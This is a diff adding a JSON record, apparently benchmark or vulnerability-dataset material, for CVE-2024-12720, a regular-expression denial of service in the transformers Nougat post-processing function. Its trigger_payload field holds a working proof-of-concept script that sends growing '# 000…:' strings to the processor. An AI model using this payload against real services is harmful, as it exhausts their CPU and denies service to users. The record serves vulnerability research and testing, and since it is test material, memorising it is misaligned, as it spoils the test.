@@ -1,0 +1,15 @@
+{
+  "file_id": "223_transformers_huntr_4bed1214-7835-4252-a853-22bbad891f98",
+  "numeric_id": "223",
+  "library_hint": "transformers",
+  "source": "huntr",
+  "title": "Inefficient regular expression complexity in post_process_single() function leading to ReDoS",
+  "cve": "CVE-2024-12720",
+  "cwe": "CWE-1333: Inefficient Regular Expression Complexity",
+  "library": "transformers",
+  "affected_version": ">= 4.46.3",
+  "vulnerable_function": "post_process_single",
+  "triggerability": "indirect",
+  "trigger_payload": "from huggingface_hub import hf_hub_download\nimport re\nimport time\nfrom PIL import Image\nfrom transformers import NougatProcessor, VisionEncoderDecoderModel, NougatTokenize\nfrom datasets import load_dataset\nimport torch\nprocessor = NougatProcessor.from_pretrained(\"facebook/nougat-base\")\nfor i in range(1, 50):\n    padding = i * \"0\"\n    input_str = f\"# {padding}:\"\n    start_time = time.time()\n    sequence = processor.post_process_generation(input_str, fix_markdown=False)\n    # or sequence = processor.post_process_single(input_str, fix_markdown=False)\n    end_time = time.time()\n    print(f\"Execution time: {end_time - start_time:.6f} s , Payload (len={len(input_str)}): {input_str}\")",
+  "oracle": "Exponential increase in execution time and high CPU usage when processing input strings with increasing number of '0' characters"
+}
